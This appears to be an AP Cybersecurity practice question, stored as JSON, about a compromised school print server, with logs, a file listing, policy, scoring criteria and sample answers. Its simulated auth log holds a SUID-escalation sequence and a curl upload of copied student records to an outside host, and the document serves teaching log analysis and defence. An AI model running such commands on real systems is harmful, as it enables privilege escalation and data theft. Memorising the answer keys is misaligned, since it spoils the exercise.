@@ -1,0 +1,453 @@
+{
+  "_comment": [
+    "DEVICE SECURITY ANALYSIS practice set 3.",
+    "",
+    "The password attack here is SPRAYING, and it is deliberately the third",
+    "distinct pattern in the library:",
+    "  kiosk    enumeration    one try each across usernames that DO NOT exist",
+    "  laptop   brute force    many tries against ONE account, at machine speed",
+    "  this one spraying       one try each across accounts that DO exist, three",
+    "                          minutes apart, which is slow enough to stay under a",
+    "                          lockout threshold",
+    "The tell is 'Failed password for <name>' rather than 'invalid user', so the",
+    "accounts are real, plus the spacing. A student who learned 'ten failures in",
+    "ten seconds' from the earlier sets has to look at the clock here.",
+    "",
+    "Part C teaches the SUID bit, which neither earlier set covers. The listing",
+    "carries -rwsr-xr-x on a root-owned helper, and part E is the escalation that",
+    "uses it. So C and E are the same fact read twice."
+  ],
+  "course": "ap-cybersecurity",
+  "set_id": "dsa-print-server",
+  "title": "Device Security Analysis: the district print server",
+  "device": "Print server, Northgate School District",
+  "est_minutes": 50,
+  "page_handle": "ap-cybersecurity-frq-print-server",
+  "page_title": "AP Cybersecurity FRQ Practice: Device Security Analysis | Print Server",
+  "seo_description": "A third Device Security Analysis practice question: password spraying, a SUID escalation, and six sources from one device, with sample responses.",
+  "intro": [
+    "The following sources all come from the same device and were captured during a risk assessment.",
+    "The device is the district print server at 10.40.2.15. Every school office sends print jobs to it, and completed jobs are held in a spool directory for 24 hours. Counsellors print individual education plans on it.",
+    "Use the sources to respond to parts A, B, C, D, and E. Label any subparts. Cite specific evidence from the sources in your responses."
+  ],
+  "sources": [
+    {
+      "kind": "firewall-rules",
+      "label": "Source 1: Device firewall settings",
+      "note": "The device's IP address is 10.40.2.15.",
+      "columns": [
+        "Rule",
+        "Action",
+        "Source",
+        "Destination",
+        "Direction",
+        "Port",
+        "Protocol"
+      ],
+      "rules": [
+        [
+          "1",
+          "Allow",
+          "10.40.0.0/16",
+          "10.40.2.15",
+          "Inbound",
+          "631",
+          "IPP"
+        ],
+        [
+          "2",
+          "Allow",
+          "10.40.0.0/16",
+          "10.40.2.15",
+          "Inbound",
+          "22",
+          "SSH"
+        ],
+        [
+          "3",
+          "Allow",
+          "10.40.2.15",
+          "ALL",
+          "Outbound",
+          "443",
+          "HTTPS"
+        ],
+        [
+          "4",
+          "Allow",
+          "10.40.2.15",
+          "10.40.1.5",
+          "Outbound",
+          "53",
+          "DNS"
+        ],
+        [
+          "5",
+          "Deny",
+          "ALL",
+          "10.40.2.15",
+          "Inbound",
+          "445",
+          "SMB"
+        ],
+        [
+          "6",
+          "Allow",
+          "10.40.2.15",
+          "ALL",
+          "Outbound",
+          "80",
+          "HTTP"
+        ],
+        [
+          "7",
+          "Deny",
+          "ALL",
+          "10.40.2.15",
+          "Inbound",
+          "23",
+          "Telnet"
+        ],
+        [
+          "8",
+          "Allow",
+          "10.40.2.15",
+          "10.40.2.0/24",
+          "Outbound",
+          "9100",
+          "RAW"
+        ],
+        [
+          "9",
+          "Deny",
+          "ALL",
+          "ALL",
+          "Inbound",
+          "ALL",
+          "ALL"
+        ],
+        [
+          "10",
+          "Allow",
+          "10.40.2.15",
+          "ALL",
+          "Outbound",
+          "ALL",
+          "ALL"
+        ]
+      ]
+    },
+    {
+      "kind": "auth-log",
+      "label": "Source 2: Authorization log",
+      "command": "sudo tail -n 30 /var/log/auth.log",
+      "lines": [
+        "1 - May 06 06:15:03 printsrv sshd[512]: Server listening on 0.0.0.0 port 22.",
+        "2 - May 06 07:40:11 printsrv systemd-logind[498]: New session 3 of user itdesk.",
+        "3 - May 06 09:02:14 printsrv sshd[1201]: Failed password for jbenner from 10.40.7.88 port 51002 ssh2",
+        "4 - May 06 09:05:19 printsrv sshd[1214]: Failed password for mruiz from 10.40.7.88 port 51044 ssh2",
+        "5 - May 06 09:08:22 printsrv sshd[1229]: Failed password for kodom from 10.40.7.88 port 51090 ssh2",
+        "6 - May 06 09:11:27 printsrv sshd[1243]: Failed password for tharlow from 10.40.7.88 port 51137 ssh2",
+        "7 - May 06 09:14:31 printsrv sshd[1258]: Failed password for dpatel from 10.40.7.88 port 51180 ssh2",
+        "8 - May 06 09:17:36 printsrv sshd[1272]: Failed password for spark from 10.40.7.88 port 51225 ssh2",
+        "9 - May 06 09:20:40 printsrv sshd[1287]: Failed password for lnguyen from 10.40.7.88 port 51268 ssh2",
+        "10 - May 06 09:23:44 printsrv sshd[1301]: Failed password for cwhite from 10.40.7.88 port 51313 ssh2",
+        "11 - May 06 09:26:49 printsrv sshd[1316]: Failed password for itdesk from 10.40.7.88 port 51357 ssh2",
+        "12 - May 06 09:29:53 printsrv sshd[1330]: Accepted password for spoolsvc from 10.40.7.88 port 51401 ssh2",
+        "13 - May 06 09:29:53 printsrv sshd[1330]: pam_unix(sshd:session): session opened for user spoolsvc by (uid=0)",
+        "14 - May 06 09:30:22 printsrv spoolsvc: executed command: 'id'",
+        "15 - May 06 09:30:41 printsrv spoolsvc: executed command: 'ls -l /usr/local/bin'",
+        "16 - May 06 09:31:05 printsrv spoolsvc: executed command: 'find / -perm -4000 -type f 2>/dev/null'",
+        "17 - May 06 09:32:18 printsrv spoolsvc: executed command: '/usr/local/bin/spooladmin --shell'",
+        "18 - May 06 09:32:18 printsrv kernel: [ 8821.4] spooladmin[1402]: setuid(0) succeeded for uid=1004",
+        "19 - May 06 09:32:19 printsrv spoolsvc: executed command: 'id'",
+        "20 - May 06 09:33:02 printsrv root: executed command: 'cat /var/spool/print/held/iep_grade9_may.pdf'",
+        "21 - May 06 09:33:40 printsrv root: executed command: 'cp -r /var/spool/print/held /tmp/h'",
+        "22 - May 06 09:34:11 printsrv kernel: [UFW BLOCK] IN=eth0 SRC=10.40.7.88 DST=10.40.2.15 PROTO=TCP SPT=52110 DPT=445",
+        "23 - May 06 09:34:19 printsrv kernel: [UFW BLOCK] IN=eth0 SRC=10.40.7.88 DST=10.40.2.15 PROTO=TCP SPT=52114 DPT=445",
+        "24 - May 06 09:35:50 printsrv root: executed command: 'curl -T /tmp/h.tar https://cdn.example-cache.net/i'",
+        "25 - May 06 09:36:30 printsrv root: executed command: 'rm -rf /tmp/h /tmp/h.tar'",
+        "26 - May 06 09:37:02 printsrv sshd[1330]: pam_unix(sshd:session): session closed for user spoolsvc",
+        "27 - May 06 12:00:01 printsrv CRON[1600]: pam_unix(cron:session): session opened for user root by (uid=0)",
+        "28 - May 06 12:00:02 printsrv CRON[1600]: pam_unix(cron:session): session closed for user root",
+        "29 - May 06 15:22:40 printsrv sudo: itdesk : TTY=pts/0 ; PWD=/home/itdesk ; USER=root ; COMMAND=/usr/bin/systemctl restart cups",
+        "30 - May 06 15:22:41 printsrv sudo: pam_unix(sudo:session): session opened for user root by itdesk(uid=1001)"
+      ]
+    },
+    {
+      "kind": "app-log",
+      "label": "Source 3: Print spooler log",
+      "command": "sudo tail -n 10 /var/log/cups/access_log",
+      "lines": [
+        "1 - May 06 08:14:02 printsrv cups: job 4411 queued by mruiz, 6 pages, held",
+        "2 - May 06 08:51:37 printsrv cups: job 4412 queued by counsel1, 22 pages, held",
+        "3 - May 06 09:02:00 printsrv cups: job 4412 title 'iep_grade9_may.pdf'",
+        "4 - May 06 09:33:02 printsrv cups: job 4412 file accessed by uid=0",
+        "5 - May 06 09:40:15 printsrv cups: job 4413 queued by jbenner, 2 pages, printed",
+        "6 - May 06 11:02:44 printsrv cups: job 4414 queued by spark, 14 pages, printed",
+        "7 - May 06 13:30:09 printsrv cups: job 4415 queued by counsel1, 18 pages, held",
+        "8 - May 06 15:23:00 printsrv cups: service restarted by itdesk",
+        "9 - May 06 16:44:21 printsrv cups: job 4416 queued by kodom, 3 pages, printed",
+        "10 - May 06 18:00:00 printsrv cups: nightly spool purge skipped, held jobs retained"
+      ]
+    },
+    {
+      "kind": "file-listing",
+      "label": "Source 4: File permissions in /usr/local/bin",
+      "command": "ls -l /usr/local/bin",
+      "columns": [
+        "Permissions",
+        "Links",
+        "Owner",
+        "Group",
+        "Size",
+        "Modified",
+        "Name"
+      ],
+      "entries": [
+        [
+          "-rwsr-xr-x",
+          "1",
+          "root",
+          "root",
+          "24880",
+          "Feb 02 10:14",
+          "spooladmin"
+        ],
+        [
+          "-rwxr-xr-x",
+          "1",
+          "root",
+          "root",
+          "3402",
+          "Feb 02 10:14",
+          "queue_report.sh"
+        ],
+        [
+          "-rw-r--r--",
+          "1",
+          "root",
+          "root",
+          "1188",
+          "Feb 02 10:14",
+          "spool.conf"
+        ],
+        [
+          "-rwxrwxr-x",
+          "1",
+          "root",
+          "spoolops",
+          "2140",
+          "Apr 28 16:20",
+          "purge_held.sh"
+        ],
+        [
+          "-rw-r-----",
+          "1",
+          "root",
+          "spoolops",
+          "640",
+          "Feb 02 10:14",
+          "spool_credentials.ini"
+        ]
+      ]
+    },
+    {
+      "kind": "process-list",
+      "label": "Source 5: Listening services",
+      "command": "ss -tuln",
+      "lines": [
+        "Netid  State   Local Address:Port    Peer Address:Port",
+        "tcp    LISTEN  0.0.0.0:631          0.0.0.0:*",
+        "tcp    LISTEN  0.0.0.0:22           0.0.0.0:*",
+        "tcp    LISTEN  0.0.0.0:9100         0.0.0.0:*"
+      ]
+    },
+    {
+      "kind": "policy",
+      "label": "Source 6: District device acceptable use policy",
+      "sections": {
+        "Required": [
+          "Service accounts must not permit interactive login.",
+          "Held print jobs containing student records must be purged at the end of each day.",
+          "Any program that runs with elevated privileges must be reviewed annually by district IT."
+        ],
+        "Permitted": [
+          "Staff may submit print jobs from any district workstation on 10.40.0.0/16.",
+          "District IT may connect over SSH to perform maintenance."
+        ],
+        "Prohibited": [
+          "Copying queued documents off the print server.",
+          "Reusing a password across more than one district account.",
+          "Installing software on the print server without district IT approval."
+        ]
+      }
+    }
+  ],
+  "parts": {
+    "A": {
+      "subject": "policy",
+      "stem": "Consider the acceptable use policy in Source 6.",
+      "subparts": [
+        {
+          "verb": "Explain",
+          "prompt": "Explain how one part of the policy helps protect the device.",
+          "credit": [
+            "Names one specific policy item",
+            "Explains the protection in terms of a threat it reduces"
+          ],
+          "sample": "The Required section says held print jobs containing student records must be purged at the end of each day. This limits how much is exposed when the device is compromised. Source 3 row 10 shows the nightly purge was skipped and held jobs were retained, and row 4 shows job 4412, an individual education plan, being read by uid 0 during the intrusion. If the purge had run, the attacker would have reached an empty spool directory instead of a day's worth of student records."
+        },
+        {
+          "verb": "Explain",
+          "prompt": "Explain how one rule in the current policy could be modified to make the device more secure. Include a specific example in your response.",
+          "credit": [
+            "Identifies a specific rule that is too weak",
+            "States a concrete modification",
+            "Connects it to evidence from the sources"
+          ],
+          "sample": "The Required section says service accounts must not permit interactive login, but the policy states it without saying how it is enforced, and row 12 shows spoolsvc accepting an interactive SSH session. The rule could be modified to require that every service account has its login shell set to /usr/sbin/nologin and is listed in DenyUsers in the SSH configuration, checked at each annual review. Concretely, adding DenyUsers spoolsvc to /etc/ssh/sshd_config would have turned the successful password at row 12 into a refused connection."
+        }
+      ]
+    },
+    "B": {
+      "subject": "password-attack",
+      "stem": "In the authorization log, there is evidence of a password attack in rows 3 to 12.",
+      "subparts": [
+        {
+          "verb": "Describe",
+          "prompt": "Describe the evidence in the log file that indicates a password attack. Include specific entries from the log file in your response.",
+          "credit": [
+            "Cites at least two specific rows",
+            "Notes ONE attempt per account across many accounts",
+            "Notes the roughly three minute spacing and explains why it matters",
+            "Identifies it as password spraying"
+          ],
+          "sample": "Rows 3 to 11 are nine failed SSH logins from one address, 10.40.7.88, each against a different account: jbenner, mruiz, kodom, tharlow, dpatel, spark, lnguyen, cwhite and itdesk. Each account is tried once, and the attempts are about three minutes apart, from 09:02:14 to 09:26:49. The messages read Failed password for jbenner rather than for invalid user, so these are real accounts. That combination is password spraying: one likely password tried across many accounts, spaced out so no single account reaches a lockout threshold. Row 12 then shows Accepted password for spoolsvc from the same address, so the tenth account tried was the one still using that password."
+        },
+        {
+          "verb": "Identify",
+          "prompt": "Identify the IP address of the adversary.",
+          "credit": [
+            "States 10.40.7.88"
+          ],
+          "sample": "10.40.7.88"
+        }
+      ]
+    },
+    "C": {
+      "subject": "permissions",
+      "stem": "Consider all the sources from the device.",
+      "subparts": [
+        {
+          "verb": "Explain",
+          "prompt": "Explain how the permission settings for one file in the /usr/local/bin directory determine the level of access for that file for the owner, group, and all other users on the system. Include the name of the file in your response.",
+          "credit": [
+            "Names a specific file from Source 4",
+            "Reads all three triads correctly",
+            "Identifies the s in the owner triad as the setuid bit and says what it does"
+          ],
+          "sample": "spooladmin has permissions -rwsr-xr-x and is owned by root. The owner triad reads rws: read, write, and an s in place of x. That s is the setuid bit, and it means the program runs with the privileges of its owner rather than of the user who launched it, so any user who runs spooladmin runs it as root. The group triad r-x and the other triad r-x give the group and every other user read and execute. Because the other triad includes execute, every account on this device can start a root-privileged program. Row 16 shows the attacker searching for exactly this with find / -perm -4000, and row 18 shows setuid(0) succeeding for uid 1004."
+        },
+        {
+          "verb": "Describe",
+          "prompt": "Other than removing all permissions from all users, describe one way the permission settings for one file on the system could be configured to restrict access for some users on the device. Include the name of the file in your response.",
+          "credit": [
+            "Names a specific file",
+            "Describes a restriction that leaves the file usable for its purpose",
+            "Identifies which class loses which access"
+          ],
+          "sample": "purge_held.sh is currently -rwxrwxr-x, so the spoolops group can write to it and every other user can execute it. It could be configured so that root keeps read, write and execute, the spoolops group keeps read and execute but loses write, and all other users have no access. The nightly purge, which runs as root, still works, spoolops members can still run and inspect it, and a compromised ordinary account can neither run it nor rewrite what it does. Removing group write matters most here: a script that root executes must not be writable by a group that ordinary accounts can join."
+        },
+        {
+          "verb": "Write",
+          "prompt": "Using the explanation from part C (ii), write one or more chmod commands that set the permissions described.",
+          "credit": [
+            "Command names the correct file",
+            "Mode produces exactly the described access",
+            "Valid chmod syntax"
+          ],
+          "sample": "chmod 750 /usr/local/bin/purge_held.sh\n\nThe 7 gives root read, write and execute, the 5 gives the spoolops group read and execute with no write, and the 0 gives all other users nothing. The symbolic form chmod u=rwx,g=rx,o= /usr/local/bin/purge_held.sh is equivalent. Separately, removing the setuid bit from spooladmin would be chmod u-s /usr/local/bin/spooladmin, which closes the escalation in part E."
+        }
+      ]
+    },
+    "D": {
+      "subject": "firewall",
+      "stem": "Consider all the sources from the device.",
+      "subparts": [
+        {
+          "verb": "Explain",
+          "prompt": "Explain how one connection attempt on the device was blocked by the device's firewall. Include evidence from a log file in your response.",
+          "credit": [
+            "Cites a specific log row showing the block",
+            "Names the rule number",
+            "Matches port and protocol to the rule"
+          ],
+          "sample": "Rows 22 and 23 show UFW BLOCK entries at 09:34:11 and 09:34:19 for inbound traffic from 10.40.7.88 to 10.40.2.15 on destination port 445. Rule 5 denies all inbound SMB to this device, so the attempts were dropped before reaching any file sharing service. The timing matters: they fall between the attacker copying the held jobs at row 21 and uploading them at row 24, so this was an attempt to move the copied files off over SMB before falling back to HTTPS."
+        },
+        {
+          "verb": "Describe",
+          "prompt": "Other than allowing all traffic for all services, describe a modification to one firewall rule that would allow the connection attempt identified in part D (i).",
+          "credit": [
+            "Names the rule being changed",
+            "Modification is scoped",
+            "Would permit the described attempt"
+          ],
+          "sample": "Rule 5 denies inbound SMB from every source. It could be modified to deny inbound port 445 except from a named file server, or an allow could be inserted above it for source 10.40.7.88 to destination 10.40.2.15 inbound on port 445. Rule 9 denies everything unmatched, so the new allow has to sit above both rule 5 and rule 9 to have any effect."
+        },
+        {
+          "verb": "Describe",
+          "prompt": "Other than allowing the connection attempt identified in part D (i), describe one impact of your modification from part D (ii) on incoming or outgoing network traffic on the device.",
+          "credit": [
+            "Describes a consequence beyond the intended one",
+            "Follows from the specific modification"
+          ],
+          "sample": "Opening SMB means the print server now exposes a file sharing service to at least one other host, and SMB has historically been the protocol worm-style malware uses to spread inside a network. Any device that can present that source address reaches it. It also changes what the logs mean: inbound 445 stops being an unambiguous sign of something wrong, so the two blocks at rows 22 and 23, which are currently a clear alert, would become ordinary traffic that nobody looks at."
+        }
+      ]
+    },
+    "E": {
+      "subject": "second-attack",
+      "stem": "Apart from the password attack identified in part B, there is evidence of another attack on the device. Consider all the sources from the device.",
+      "subparts": [
+        {
+          "verb": "Determine",
+          "prompt": "Determine the type of attack evidenced in a log file.",
+          "credit": [
+            "Names a specific attack type",
+            "Matches the evidence: privilege escalation, specifically via a setuid program"
+          ],
+          "sample": "Privilege escalation. The attacker entered as an ordinary service account and used a setuid root program to become root, then read and copied files that account could not otherwise reach."
+        },
+        {
+          "verb": "Describe",
+          "prompt": "Describe specific information in the log file that indicates the attack named in part E (i).",
+          "credit": [
+            "Cites the search for setuid files",
+            "Cites the setuid success and the uid change",
+            "Shows what the elevated access was then used for"
+          ],
+          "sample": "Row 14 shows the attacker running id immediately after login, establishing what they were. Row 16 is find / -perm -4000 -type f, which searches the whole filesystem for setuid programs, and Source 4 shows spooladmin is exactly that, -rwsr-xr-x owned by root. Row 17 runs /usr/local/bin/spooladmin --shell and row 18 records setuid(0) succeeded for uid=1004, so the process became root. From row 20 onward the log prefix changes from spoolsvc to root, and those rows read a student individual education plan and copy the entire held spool directory. Source 3 row 4 independently records job 4412 being accessed by uid=0."
+        },
+        {
+          "verb": "Describe",
+          "prompt": "Describe one way an automated system could halt this type of attack in real time.",
+          "credit": [
+            "Names a specific automated control",
+            "Explains the mechanism against THIS attack"
+          ],
+          "sample": "An endpoint detection and response agent watching for privilege transitions could halt it. The sequence of an interactive service account session, a filesystem wide search for setuid binaries, and then a setuid(0) call from a uid that has never previously become root is a strong signal, and an EDR agent can kill the process at the setuid call rather than after. A mandatory access control system such as AppArmor or SELinux would also stop it structurally, by confining spooladmin to the spool directories so that becoming root through it grants nothing useful."
+        },
+        {
+          "verb": "Identify",
+          "prompt": "This attack could be mitigated by an automated system, such as a firewall, IDS, IPS, or AI. Identify a different countermeasure that could mitigate, prevent, or deter the attack.",
+          "credit": [
+            "Names a non automated countermeasure",
+            "Plausibly prevents, mitigates or deters this attack"
+          ],
+          "sample": "Removing the setuid bit from spooladmin and having district IT review every elevated-privilege program, which the Required section of Source 6 already calls for annually. If spooladmin did not run as root, the find in row 16 would return nothing useful and the escalation at rows 17 and 18 becomes impossible. This is a configuration and review control rather than a detection system, so it holds even when nothing is watching the device."
+        }
+      ]
+    }
+  }
+}
